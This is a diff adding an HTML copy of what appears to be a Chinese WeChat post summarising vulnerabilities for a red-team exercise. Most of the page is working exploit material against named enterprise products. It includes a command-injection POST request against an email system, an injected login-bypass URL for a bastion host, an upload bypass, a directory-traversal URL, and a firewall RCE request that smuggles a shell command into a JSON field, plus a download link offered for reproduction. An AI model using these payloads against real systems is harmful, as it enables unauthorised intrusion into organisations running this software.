@@ -1,0 +1,111 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>hvv4月10汇总</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>hvv4月10汇总</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzkyNjIxNDIyMA==&amp;mid=2247483688&amp;idx=1&amp;sn=24554d8ab9cf74af3019b03d3614954a&amp;chksm=c23bf00bf54c791dbaa611ab9754d4d2c0db54851506d371a055a2ce1befe71d583b11a99c7e&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzkyNjIxNDIyMA==&amp;mid=2247483688&amp;idx=1&amp;sn=24554d8ab9cf74af3019b03d3614954a&amp;chksm=c23bf00bf54c791dbaa611ab9754d4d2c0db54851506d371a055a2ce1befe71d583b11a99c7e&amp;scene=27#wechat_redirect</a></blockquote><div><p><img style="width:352.000000px;" data-type="2" data-ratio="1.778409" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIzRCmmvXJnPHM8iaK7vTNsVkjia5TicBkbm24PQ3KGfibMc7njEQ3E13SeYnmY8l0kWnBh2NFuBariaJ1Q/640?wx_fmt=jpeg" class="item item-image" src="../Images/b83191cafc976c64e7456f9cad679669.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIzRCmmvXJnPHM8iaK7vTNsVkjia5TicBkbm24PQ3KGfibMc7njEQ3E13SeYnmY8l0kWnBh2NFuBariaJ1Q/640?wx_fmt=jpeg"/></p><p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">恶意IP：</span></p>
+<p><img style="width:1080.000000px;" data-type="2" data-ratio="1.777778" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIzRCmmvXJnPHM8iaK7vTNsVkmib2fBZEdFNTFhIMT3aQG21n1ibZZgCNic4RPWst64AibHUVSI7l2BG1aA/640?wx_fmt=jpeg" class="item item-image" src="../Images/2f48f4b2a2506dc86384744cdeb8a8ea.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIzRCmmvXJnPHM8iaK7vTNsVkmib2fBZEdFNTFhIMT3aQG21n1ibZZgCNic4RPWst64AibHUVSI7l2BG1aA/640?wx_fmt=jpeg"/></p><p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;"><span style="font-family:'PingFang SC';font-size:19px;font-weight:bold;letter-spacing:2px;color:#333333;">漏洞情况</span><span style="font-family:'PingFang SC';font-size:16px;letter-spacing:2px;color:#333333;">：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞名称：某邮电子邮件系统存在远程命令执行漏洞</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">产品介绍：国内专业的邮件系统软件及整体解决方案，20年来积极致力于为电信运营商、政府、企业、教育等行业客户提供专业的技术平台和完整的网络通讯解决方案</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">利用方式：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">访问如下页面返回正常</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">ip/webadm/?q=moni_detail.do&amp;action=gragh</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">构造post请求</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">POST /webadm/?q=moni_detail.do&amp;action=gragh HTTP/1.1</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Host: ip</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Connection: close</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Upgrade-Insecure-Requests: 1</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Sec-Fetch-Site: none</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Sec-Fetch-Mode: navigate</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Sec-Fetch-Dest: document</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Accept-Encoding: gzip, deflate</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Accept-Language: zh-CN,zh;q=0.9</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Content-Type: application/x-www-form-urlencoded</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Content-Length: 16</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">type='|whoami||'</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞名称：某治堡垒机任意用户登录</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">产品介绍：面向企业/事业单位及政府部门内部的数据中心运维安全管理而推出的运维安全核心平台</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">利用方式：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">HTTP：//x.x.x.x/audit/gui_detail_view.php?token=1&amp;id=%5C&amp;uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&amp;login=shterm</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞名称：某山终端安全系统文件上传漏洞</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">产品介绍：终端安全系统</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">利用方式：根据漏洞点:/tools/manage/upload.php构造POST包，filename为32位的md5即可上传成功。</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞名称：某友NC目录遍历漏洞</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">产品介绍：某友NC协同管理软件</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">利用方式：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">http://****/NCFindWeb?service=IPreAlertConfigService&amp;filename=[遍历地址]</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">漏洞名称：金山WPS Office远程堆损坏漏洞CVE-2020-25291</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">官方公告：https://security.wps.cn/notices/6</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">目前该漏洞已修复</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;"><span style="font-family:'PingFang SC';font-size:19px;font-weight:bold;letter-spacing:2px;color:#333333;">复现自取</span><span style="font-family:'PingFang SC';font-size:16px;letter-spacing:2px;color:#333333;">：</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">链接：https://pan.baidu.com/s/1PQoG4EIAOyp5XhtGXTxfvQ</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">提取码：6gz2</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:19px;font-weight:bold;"><span style="letter-spacing:2px;color:#333333;">漏洞预警：奇安信网康下一代防火墙 RCE</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">http://X.X.X.X/directdata/direct/router</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">请求头(requestHeader)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Host: X.X.X.X</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Content-Length: 155</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Content-Type: application/json</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">X-Requested-With: XMLHttpRequest</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Accept-Encoding: gzip</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">请求Body(requestBody)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">{</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">  "action": "SSLVPN_Resource",</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">  "method": "deleteImage",</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">  "data": [{</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">      "data": ["/var/www/html/d.txt;echo '5b926437'&gt;/var/www/html/5b926.txt"]</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">  }],</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">  "type": "rpc",</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">  "tid": 17</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">}</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">http://X.X.X.X/directdata/direct/router</span></p>
+</div>
+        
+</body>
+</html>
